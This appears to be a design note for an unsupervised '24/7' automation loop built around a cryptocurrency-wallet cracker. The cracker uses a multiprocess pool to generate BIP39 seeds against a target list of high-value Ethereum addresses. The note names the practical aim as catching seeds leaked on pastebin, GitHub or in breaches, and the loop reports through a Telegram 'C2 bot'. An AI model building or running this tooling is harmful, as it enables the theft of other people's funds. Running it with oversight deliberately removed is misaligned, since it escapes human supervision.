# Continuous Autopilot — 24/7 Autonomous Operation

For systems that need to run indefinitely without supervision:

## Architecture

A `while True` loop running a full pipeline on a timer (e.g. 10 minutes), with each step wrapped in try/except so one failure doesn't kill the whole cycle:

```
while True:
    try: crawl()
    except: log("crawl failed")
    try: process()
    except: log("process failed")
    try: execute()
    except: log("execute failed")
    time.sleep(600)  # or loop 1-second sleeps checking a stop flag
```

## Background Process Pattern

```python
# Start in background
bash -c 'export PATH=./venv/bin:$PATH && export PYTHONPATH=. && exec ./venv/bin/python3 autopilot.py'

# Log to file
exec ./venv/bin/python3 autopilot.py >> output/autopilot.log 2>&1
```

## Continuous Cracker (BIP39 Brute Force)

8-core ProcessPoolExecutor generating random 12-word BIP39 seeds and deriving ETH addresses. Runs indefinitely checking against a target set of high-value addresses:

```python
CORES = cpu_count()
BATCH_SIZE = 50000  # per worker per cycle

def _worker_random_batch(batch_size, target_set):
    results = []
    for _ in range(batch_size):
        seed = generate_random_seed_12()
        addr = seed_to_eth_address(seed)
        if addr and addr in target_set:
            results.append({"address": addr, "seed": seed})
    return results

with ProcessPoolExecutor(max_workers=CORES) as pool:
    futures = [pool.submit(_worker_random_batch, BATCH_SIZE, TARGET_SET) for _ in range(CORES)]
```

Note: BIP39 derivation is CPU-intensive (full BIP44 path derivation per seed). At ~500-1000 seeds/sec on 8 cores, the probability of hitting a specific 128-bit key is effectively zero. The value is in catching fresh leaks (pastebin, GitHub, breaches), not brute-forcing existing wallets.

## Monitoring

Write a log file with timestamps. The user checks progress via:
- Dashboard HTTP endpoint (FastAPI on :9000)
- Telegram C2 bot (/status command)
- Direct log tail: `tail -f output/autopilot.log`

## Key Principle

Run 24/7 but don't burn CPU uselessly. Balance checking on-chain is the bottleneck (RPC rate limits) — batch checks and add delays. Key derivation is CPU-bound — use all cores. Network scraping is I/O-bound — use ThreadPoolExecutor.
